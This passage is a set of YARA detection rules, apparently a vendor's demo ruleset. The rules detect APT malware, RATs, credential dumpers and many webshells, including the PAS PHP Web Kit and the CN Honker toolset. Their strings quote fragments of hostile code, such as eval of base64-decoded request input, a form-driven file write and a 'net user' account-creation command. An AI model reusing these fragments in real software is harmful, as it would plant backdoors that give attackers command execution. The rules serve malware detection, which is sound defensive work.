      reference = "http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/"
      date = "2016-01-03 16:02:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, EXE, FILE, T1021_004, blackenergy"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "passDs5Bu9Te7" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and $s1
}

rule WebShell_PHP_Web_Kit_v3_RID2F7A : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects PAS Tool PHP Web Kit"
      author = "Florian Roth"
      reference = "https://github.com/wordfence/grizzly"
      date = "2016-01-01 11:58:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $php = "<?php $" 
      $php2 = "@assert(base64_decode($_REQUEST[" 
      $s1 = "(str_replace(\"\\n\", '', '" 
      $s2 = "(strrev($" ascii
      $s3 = "de'.'code';" ascii
   condition: 
      ( ( uint32 ( 0 ) == 0x68703f3c and $php at 0 ) or $php2 ) and filesize > 8KB and filesize < 100KB and all of ( $s* )
}

rule WebShell_PHP_Web_Kit_v4_RID2F7B : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects PAS Tool PHP Web Kit"
      author = "Florian Roth"
      reference = "https://github.com/wordfence/grizzly"
      date = "2016-01-01 11:59:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $php = "<?php $" 
      $s1 = "(StR_ReplAcE(\"\\n\",''," 
      $s2 = ";if(PHP_VERSION<'5'){" ascii
      $s3 = "=SuBstr_rePlACe(" ascii
   condition: 
      uint32 ( 0 ) == 0x68703f3c and $php at 0 and filesize > 8KB and filesize < 100KB and 2 of ( $s* )
}

rule XOR_4byte_Key_RID2BD9 : APT DEMO EXE FILE {
   meta:
      description = "Detects an executable encrypted with a 4 byte XOR (also used for Derusbi Trojan)"
      author = "Florian Roth"
      reference = "http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family"
      date = "2015-12-15 09:24:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = { 85 C9 74 0A 31 06 01 1E 83 C6 04 49 EB F2 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them
}

rule Winnti_signing_cert_RID2EE5 : CHINA DEMO EXE FILE G0044 MAL {
   meta:
      description = "Detects a signing certificate used by the Winnti APT group"
      author = "Florian Roth"
      reference = "https://securelist.com/analysis/publications/72275/i-am-hdroot-part-1/"
      date = "2015-10-10 11:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a9a8dc4ae77b1282f0c8bdebd2643458fc1ceb3145db4e30120dd81676ff9b61"
      hash2 = "9001572983d5b1f99787291edaadbb65eb2701722f52470e89db2c59def24672"
      tags = "CHINA, DEMO, EXE, FILE, G0044, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Guangzhou YuanLuo Technology Co." ascii
      $s2 = "Guangzhou YuanLuo Technology Co.,Ltd" ascii
      $s3 = "$Asahi Kasei Microdevices Corporation0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them
}

rule Indetectables_RAT_RID2D8E : DEMO EXE FILE MAL {
   meta:
      description = "Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux"
      author = "Florian Roth"
      reference = "http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/"
      date = "2015-10-01 10:36:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "081905074c19d5e32fd41a24b4c512d8fd9d2c3a8b7382009e3ab920728c7105"
      hash2 = "66306c2a55a3c17b350afaba76db7e91bfc835c0e90a42aa4cf59e4179b80229"
      hash3 = "1fa810018f6dd169e46a62a4f77ae076f93a853bfc33c7cf96266772535f6801"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Coded By M3" fullword wide
      $s2 = "Stub Undetector M3" fullword wide
      $s3 = "www.webmenegatti.com.br" wide
      $s4 = "M3n3gatt1" fullword wide
      $s5 = "TheMisterFUD" fullword wide
      $s6 = "KillZoneKillZoneKill" fullword ascii
      $s7 = "[[__M3_F_U_D_M3__]]$" fullword ascii
      $s8 = "M3_F_U_D_M3" ascii
      $s9 = "M3n3gatt1hack3r" fullword wide
      $s10 = "M3n3gatt1hack3r" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 1 of them
}

rule QuarksPwDump_Gen_RID2D5E : DEMO GEN HKTL {
   meta:
      description = "Detects all QuarksPWDump versions"
      author = "Florian Roth"
      reference = "-"
      date = "2015-09-29 10:28:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2b86e6aea37c324ce686bd2b49cf5b871d90f51cec24476daa01dd69543b54fa"
      hash2 = "87e4c76cd194568e65287f894b4afcef26d498386de181f568879dde124ff48f"
      hash3 = "a59be92bf4cce04335bd1a1fcf08c1a94d5820b80c068b3efe13e2ca83d857c9"
      tags = "DEMO, GEN, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "OpenProcessToken() error: 0x%08X" fullword ascii
      $s2 = "%d dumped" fullword ascii
      $s3 = "AdjustTokenPrivileges() error: 0x%08X" fullword ascii
      $s4 = "\\SAM-%u.dmp" ascii
   condition: 
      all of them
}

rule Unit78020_Malware_Gen2_RID2E85 : APT CHINA DEMO EXE FILE GEN {
   meta:
      description = "Detects malware by Chinese APT PLA Unit 78020 - Generic Rule"
      author = "Florian Roth"
      reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
      date = "2015-09-24 11:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "76c586e89c30a97e583c40ebe3f4ba75d5e02e52959184c4ce0a46b3aac54edd"
      hash2 = "7b73bf2d80a03eb477242967628da79924fbe06cc67c4dcdd2bdefccd6e0e1af"
      hash3 = "981e2fa1ae4145359036b46e8b53cc5da37dd2311204859761bd91572f025e8a"
      tags = "APT, CHINA, DEMO, EXE, FILE, GEN"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "-GetModuleFileNameExW" fullword ascii
      $s1 = "\\MSN Talk Start.lnk" wide
      $s2 = ":SeDebugPrivilege" fullword wide
      $s3 = "WinMM Version 1.0" fullword wide
      $s4 = "dwError1 = %d" fullword ascii
      $s5 = "*Can't Get" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
}

rule IronPanda_Malware_Htran_RID3011 : APT CHINA DEMO EXE T1020 T1090 {
   meta:
      description = "Iron Panda Malware Htran"
      author = "Florian Roth"
      reference = "https://goo.gl/E4qia9"
      date = "2015-09-16 12:24:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, CHINA, DEMO, EXE, T1020, T1090"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[-] Gethostbyname(%s) error:%s" fullword ascii
      $s2 = "%s -<listen|tran|slave> <option> [-log logfile]" fullword ascii
      $s3 = "-slave <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
      $s4 = "[-] ERROR: Must supply logfile name." fullword ascii
      $s5 = "[SERVER]connection to %s:%d error" fullword ascii
      $s6 = "[+] Make a Connection to %s:%d...." fullword ascii
      $s7 = "[+] Waiting another Client on port:%d...." fullword ascii
      $s8 = "[+] Accept a Client on port %d from %s" fullword ascii
      $s9 = "[+] Make a Connection to %s:%d ......" fullword ascii
      $s10 = "cmshared_get_ptr_from_atom" fullword ascii
      $s11 = "_cmshared_get_ptr_from_atom" ascii
      $s12 = "[+] OK! I Closed The Two Socket." fullword ascii
      $s13 = "[-] TransmitPort invalid." fullword ascii
      $s14 = "[+] Waiting for Client on port:%d ......" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 125KB and 3 of them ) or 5 of them
}

rule MAL_Emdivi_Gen4_RID2C55 : DEMO EXE FILE MAL emdivi {
   meta:
      description = "Detects Emdivi Malware"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/"
      date = "2015-08-20 09:44:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "008f4f14cf64dc9d323b6cb5942da4a99979c4c7d750ec1228d8c8285883771e"
      hash2 = "17e646ca2558a65ffe7aa185ba75d5c3a573c041b897355c2721e9a8ca5fee24"
      hash3 = "3553c136b4eba70eec5d80abe44bd7c7c33ab1b65de617dbb7be5025c9cf01f1"
      tags = "DEMO, EXE, FILE, MAL, emdivi"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = ".http_port\", " fullword wide
      $s2 = "UserAgent: " fullword ascii
      $s3 = "AUTH FAILED" fullword ascii
      $s4 = "INVALID FILE PATH" fullword ascii
      $s5 = ".autoconfig_url\", \"" fullword wide
      $s6 = "FAILED TO WRITE FILE" fullword ascii
      $s7 = ".proxy" fullword wide
      $s8 = "AuthType: " fullword ascii
      $s9 = ".no_proxies_on\", \"" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 853KB and all of them
}

rule HttpBrowser_RAT_Sample1_RID2FCD : APT DEMO EXE FILE G0027 T1574_001 {
   meta:
      description = "Threat Group 3390 APT Sample - HttpBrowser RAT Sample update.hancominc.com"
      author = "Florian Roth"
      reference = "http://snip.ly/giNB"
      date = "2015-08-06 12:12:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "be334d1f8fa65a723af65200a166c2bbdb06690c8b30fafe772600e4662fc68b"
      hash2 = "1052ad7f4d49542e4da07fa8ea59c15c40bc09a4d726fad023daafdf05866ebb"
      tags = "APT, DEMO, EXE, FILE, G0027, T1574_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "update.hancominc.com" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and $s0
}

rule HttpBrowser_RAT_Gen_RID2E54 : APT DEMO EXE FILE G0027 GEN T1574_001 {
   meta:
      description = "Threat Group 3390 APT Sample - HttpBrowser RAT Generic"
      author = "Florian Roth"
      reference = "http://snip.ly/giNB"
      date = "2015-08-06 11:09:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0299493ccb175d452866f5e21d023d3e92cd8d28452517d1d19c0f05f2c5ca27"
      hash2 = "065d055a90da59b4bdc88b97e537d6489602cb5dc894c5c16aff94d05c09abc7"
      hash3 = "05c7291db880f94c675eea336ecd66338bd0b1d49ad239cc17f9df08106e6684"
      tags = "APT, DEMO, EXE, FILE, G0027, GEN, T1574_001"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "%d|%s|%04d/%02d/%02d %02d:%02d:%02d|%ld|%d" fullword wide
      $s1 = "HttpBrowser/1.0" fullword wide
      $s2 = "set cmd : %s" ascii fullword
      $s3 = "\\config.ini" wide fullword
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 45KB and filesize > 20KB and all of them
}

rule Apolmy_Privesc_Trojan_RID2F8B : APT DEMO EXE FILE T1068 {
   meta:
      description = "Apolmy Privilege Escalation Trojan used in APT Terracotta"
      author = "Florian Roth"
      reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
      date = "2015-08-04 12:01:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, EXE, FILE, T1068"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[%d] Failed, %08X" fullword ascii
      $s2 = "[%d] Offset can not fetched." fullword ascii
      $s3 = "PowerShadow2011" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
}

rule Mithozhan_Trojan_RID2D90 : APT DEMO EXE FILE {
   meta:
      description = "Mitozhan Trojan used in APT Terracotta"
      author = "Florian Roth"
      reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
      date = "2015-08-04 10:37:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "adbrowser" fullword wide
      $s2 = "IJKLlGdmaWhram0vn36BgIOChYR3L45xcHNydXQvhmloa2ptbH8voYCDTw==" fullword ascii
      $s3 = "EFGHlGdmaWhrL41sf36BgIOCL6R3dk8=" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
}

rule MAL_MiniDionis_VBS_Dropped_RID30B4 : DEMO MAL SCRIPT {
   meta:
      description = "Dropped File - 1.vbs"
      author = "Florian Roth"
      reference = "https://malwr.com/analysis/ZDc4ZmIyZDI4MTVjNGY5NWI0YzE3YjIzNGFjZTcyYTY/"
      date = "2015-07-21 12:51:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, MAL, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Wscript.Sleep 5000" ascii
      $s2 = "Set FSO = CreateObject(\"Scripting.FileSystemObject\")" ascii
      $s3 = "Set WshShell = CreateObject(\"WScript.Shell\")" ascii
      $s4 = "If(FSO.FileExists(\"" ascii
      $s5 = "then FSO.DeleteFile(\".\\" ascii
   condition: 
      filesize < 1KB and all of them and $s1 in ( 0 .. 40 )
}

rule WildNeutron_Sample_9_RID2EE5 : APT DEMO EXE FILE {
   meta:
      description = "Wild Neutron APT Sample Rule"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/"
      date = "2015-07-10 11:34:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-01-06"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "http://get.adobe.com/flashplayer/" wide
      $s4 = " Player Installer/Uninstaller" fullword wide
      $s5 = "Adobe Flash Plugin Updater" fullword wide
      $s6 = "uSOFTWARE\\Adobe" fullword wide
      $s11 = "2008R2" fullword wide
      $s12 = "%02d.%04d.%s" fullword wide
      $s13 = "%d -> %d" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1477KB and all of them
}

rule CN_Honker_mempodipper2_6_RID3030 : CHINA DEMO HKTL {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file mempodipper2.6.39"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:29:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed" ascii
   condition: 
      filesize < 30KB and all of them
}

rule CN_Honker_Webshell_PHP_php5_RID3120 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php5.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:11"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user" ascii
      $s20 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$" ascii
   condition: 
      uint16 ( 0 ) == 0x3f3c and filesize < 300KB and all of them
}

rule CN_Honker_Webshell_offlibrary_RID328C : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file offlibrary.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:09:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "';$i=$g->query(\"SELECT SUBSTRING_INDEX(CURRENT_USER, '@', 1) AS User, SUBSTRING" ascii
      $s12 = "if(jushRoot){var script=document.createElement('script');script.src=jushRoot+'ju" ascii
   condition: 
      filesize < 1005KB and all of them
}

rule CN_Honker_Webshell_cfm_xl_RID30D5 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file xl.cfm"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:56:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<input name=\"DESTINATION\" value=\"" ascii
      $s1 = "<CFFILE ACTION=\"Write\" FILE=\"#Form.path#\" OUTPUT=\"#Form.cmd#\">" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x433c and filesize < 13KB and all of them
}

rule CN_Honker_Webshell_PHP_linux_RID31D3 : CHINA DEMO FILE LINUX T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file linux.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:39:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, LINUX, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<form name=form1 action=exploit.php method=post>" fullword ascii
      $s1 = "<title>Changing CHMOD Permissions Exploit " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x696c and filesize < 6KB and all of them
}

rule CN_Honker_Webshell_Interception3389_get_RID35C6 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file get.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:27:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "userip = Request.ServerVariables(\"HTTP_X_FORWARDED_FOR\")" fullword ascii
      $s1 = "file.writeline  szTime + \" HostName:\" + szhostname + \" IP:\" + userip+\":\"+n" ascii
      $s3 = "set file=fs.OpenTextFile(server.MapPath(\"WinlogonHack.txt\"),8,True)" fullword ascii
   condition: 
      filesize < 3KB and all of them
}

rule CN_Honker_Webshell_PHP_BlackSky_RID32B7 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php6.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:17:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "eval(gzinflate(base64_decode('" ascii
      $s1 = "B1ac7Sky-->" fullword ascii
   condition: 
      filesize < 641KB and all of them
}

rule CN_Honker_Webshell_ASPX_sniff_RID320D : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file sniff.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:48:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));" fullword ascii
      $s2 = "if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii
   condition: 
      filesize < 91KB and all of them
}

rule CN_Honker_Webshell_udf_udf_RID3139 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file udf.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:13:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<?php // Source  My : Meiam  " fullword ascii
      $s2 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii
   condition: 
      filesize < 430KB and all of them
}

rule CN_Honker_Webshell_JSP_jsp_RID30F5 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jsp.html"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:02:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<input name=f size=30 value=shell.jsp>" fullword ascii
      $s2 = "<font color=red>www.i0day.com  By:" fullword ascii
   condition: 
      filesize < 3KB and all of them
}

rule CN_Honker_Webshell_T00ls_Lpk_Sethc_v4_mail_RID36D6 : CHINA DEMO T1505_003 T1546_008 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file mail.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 17:12:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, T1546_008, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "if (!$this->smtp_putcmd(\"AUTH LOGIN\", base64_encode($this->user)))" fullword ascii
      $s2 = "$this->smtp_debug(\"> \".$cmd.\"\\n\");" fullword ascii
   condition: 
      filesize < 39KB and all of them
}

rule CN_Honker_Webshell_phpwebbackup_RID3358 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file phpwebbackup.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:43:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<?php // Code By isosky www.nbst.org" fullword ascii
      $s2 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii
   condition: 
      uint16 ( 0 ) == 0x3f3c and filesize < 67KB and all of them
}

rule CN_Honker_Webshell_dz_phpcms_phpbb_RID348F : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file dz_phpcms_phpbb.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:35:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "if($pwd == md5(md5($password).$salt))" fullword ascii
      $s2 = "function test_1($password)" fullword ascii
      $s3 = ":\".$pwd.\"\\n---------------------------------\\n\";exit;" fullword ascii
      $s4 = ":user=\".$user.\"\\n\";echo \"pwd=\".$pwd.\"\\n\";echo \"salt=\".$salt.\"\\n\";" fullword ascii
   condition: 
      filesize < 22KB and all of them
}

rule CN_Honker_Webshell_PHP_php8_RID3123 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php8.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<a href=\"http://hi.baidu.com/ca3tie1/home\" target=\"_blank\">Ca3tie1's Blog</a" ascii
      $s1 = "function startfile($path = 'dodo.zip')" fullword ascii
      $s3 = "<form name=\"myform\" method=\"post\" action=\"\">" fullword ascii
      $s5 = "$_REQUEST[zipname] = \"dodozip.zip\"; " fullword ascii
   condition: 
      filesize < 25KB and 2 of them
}

rule CN_Honker_Webshell_Tuoku_script_xx_RID34B7 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file xx.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:42:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$mysql.=\"insert into `$table`($keys) values($vals);\\r\\n\";" fullword ascii
      $s2 = "$mysql_link=@mysql_connect($mysql_servername , $mysql_username , $mysql_password" ascii
      $s16 = "mysql_query(\"SET NAMES gbk\");" fullword ascii
   condition: 
      filesize < 2KB and all of them
}

rule CN_Honker_Webshell_Injection_Transit_jmPost_RID381F : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jmPost.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 18:07:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii
      $s2 = "JmdcwName=request(\"jmdcw\")" fullword ascii
   condition: 
      filesize < 9KB and all of them
}

rule CN_Honker_Webshell_ASP_web_asp_RID3280 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file web.asp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:07:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<FORM method=post target=_blank>ShellUrl: <INPUT " fullword ascii
      $s1 = "\" >[Copy code]</a> 4ngr7&nbsp; &nbsp;</td>" fullword ascii
   condition: 
      filesize < 13KB and all of them
}

rule CN_Honker_Webshell_ASP_asp404_RID317B : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp404.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:24:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "temp1 = Len(folderspec) - Len(server.MapPath(\"./\")) -1" fullword ascii
      $s1 = "<form name=\"form1\" method=\"post\" action=\"<%= url%>?action=chklogin\">" fullword ascii
      $s2 = "<td>&nbsp;<a href=\"<%=tempurl+f1.name%>\" target=\"_blank\"><%=f1.name%></a></t" ascii
   condition: 
      filesize < 113KB and all of them
}

rule CN_Honker_Webshell_Serv_U_asp_RID3253 : CHINA DEMO T1087_002 T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file Serv-U asp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:00:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1087_002, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" &" ascii
      $s2 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun lov" ascii
